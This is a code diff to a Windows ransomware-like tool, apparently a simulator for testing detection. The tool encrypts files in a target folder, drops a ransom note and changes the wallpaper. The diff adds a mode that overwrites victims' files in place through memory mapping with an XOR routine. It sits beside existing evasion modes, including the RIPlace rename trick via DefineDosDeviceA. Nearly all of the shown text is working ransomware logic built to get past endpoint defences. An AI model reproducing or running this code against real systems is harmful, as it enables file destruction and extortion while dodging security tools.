@@ -15,7 +15,15 @@
 int mode = -1; // 1 - encrypt, 0 - decrypt, -1 - undefined
 int seq = 0;
 
-int crypt_content(HANDLE hInpFile, HANDLE hOutFile, int file_pointer_offset) {
+int crypt_content(BYTE* start_address, int size) {
+	for (int i=0; i<size; i++){
+		*(start_address+i) ^= 0xc7;
+	}
+	return true;
+}
+
+
+int crypt_content_by_handle(HANDLE hInpFile, HANDLE hOutFile, int file_pointer_offset) {
 	CHAR key[KEY_LEN];
 	for (int i = 0; i < KEY_LEN; i++) {
 		key[i] = i;
@@ -135,6 +143,11 @@ int crypt_file(char* in_file)
 {
 	HANDLE hInpFile;
 	HANDLE hOutFile;
+	HANDLE hInpFileMapping;
+
+	int InpFileSize = 0;
+
+	LPVOID lpMapAddress;
 
 	const char* dosdevPath = R"(\\.\RIPlace)";
 	const char* dosdevName = "RIPlace";
@@ -180,7 +193,7 @@ int crypt_file(char* in_file)
 			printf("Output file cannot be opened\n");
 			return false;
 		}
-		crypt_content(hInpFile, hOutFile, 4096);
+		crypt_content_by_handle(hInpFile, hOutFile, 4096);
 		CloseHandle(hInpFile);
 		CloseHandle(hOutFile);
 	}
@@ -193,7 +206,7 @@ int crypt_file(char* in_file)
 			printf("Input file cannot be opened\n");
 			return false;
 		}
-		crypt_content(hInpFile, hInpFile, 4096);
+		crypt_content_by_handle(hInpFile, hInpFile, 4096);
 		CloseHandle(hInpFile);
 		MoveFileExA(in_file, out_file, MOVEFILE_REPLACE_EXISTING);
 	}
@@ -211,7 +224,7 @@ int crypt_file(char* in_file)
 			printf("Output file cannot be opened\n");
 			return false;
 		}
-		crypt_content(hInpFile, hOutFile, 4096);
+		crypt_content_by_handle(hInpFile, hOutFile, 4096);
 		CloseHandle(hInpFile);
 		CloseHandle(hOutFile);
 		CopyFileA(out_file, in_file, 0);
@@ -232,7 +245,7 @@ int crypt_file(char* in_file)
 			printf("Output file cannot be opened\n");
 			return false;
 		}
-		crypt_content(hInpFile, hOutFile, 4096);
+		crypt_content_by_handle(hInpFile, hOutFile, 4096);
 		CloseHandle(hInpFile);
 		CloseHandle(hOutFile);
 
@@ -247,13 +260,37 @@ int crypt_file(char* in_file)
 		if (!MoveFileExA(out_file, dosdevPath, MOVEFILE_REPLACE_EXISTING)) {
 			printf("Error in MoveFileExA: %x\n", GetLastError());
 		}
-		
+
 		if (!DefineDosDeviceA(DDD_REMOVE_DEFINITION, dosdevName, 0)) {
 			printf("Error in DefineDosDeviceA DDD_REMOVE_DEFINITION: %x\n", GetLastError());
 		}
 
 	}
-
+	/*
+		Seq 4: Overwrite the original files by fileamapping   
+	*/
+	if (seq == 4) {
+		hInpFile = CreateFileA(in_file, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hInpFile == INVALID_HANDLE_VALUE) {
+			printf("Input file cannot be opened\n");
+			return false;
+		}
+		InpFileSize = GetFileSize(hInpFile, NULL);
+		hInpFileMapping = CreateFileMappingA(hInpFile, NULL, PAGE_READWRITE, 0, 0, "UCantCMe");
+		if (!hInpFileMapping) {
+			printf("Input FileMapping cannot be opened\n");
+			return false;
+		}
+		lpMapAddress = MapViewOfFile(hInpFileMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
+		if (lpMapAddress == NULL) {
+			printf("lpMapAddress is NULL, Error: %d\n", GetLastError());
+		}
+		crypt_content((BYTE*)lpMapAddress, InpFileSize);
+		UnmapViewOfFile(lpMapAddress);
+		//FlushFileBuffers(hInpFile);
+		CloseHandle(hInpFileMapping);
+		CloseHandle(hInpFile);
+	}
 	free(out_file);
 	return true;
 }
@@ -343,9 +380,33 @@ int drop_note(char* filepath) {
 	CloseHandle(hFile);
 }
 
+void help() {
+	printf(
+		"[-] Usage: tool.exe <mode> <folder>\n"
+		"\t arg1 - mode\n"
+		"\t\t 0: Decryption\n"
+		"\t\t 1: Encryption\n"
+		"\t arg2 - file I/O sequence\n"
+		"\t\t 0: Write the new file and delete the original file\n"
+		"\t\t 1: Overwrite the original file and rename\n"
+		"\t\t 2: Move the new file to the original file\n"
+		"\t\t 3: RIPlace - move the new file to the original file by DefineDosDeviceA\n"
+		"\t\t 4: Overwrite the original files by fileamapping\n"
+		"\t arg3 - target folder\n"
+		"\t arg4 - wallpaper source location\n"
+		"\t arg5 - ransom note location\n"
+	
+	);
+
+
+
+
+}
+
+
 int main(int argc, char* argv[]) {
 	if (argc < 4) {
-		printf("[-] Usage: tool.exe <mode> <folder>");
+		help();
 		return -1;
 	}
 	printf("[+] arg1 - mode: %s \n", argv[1]);
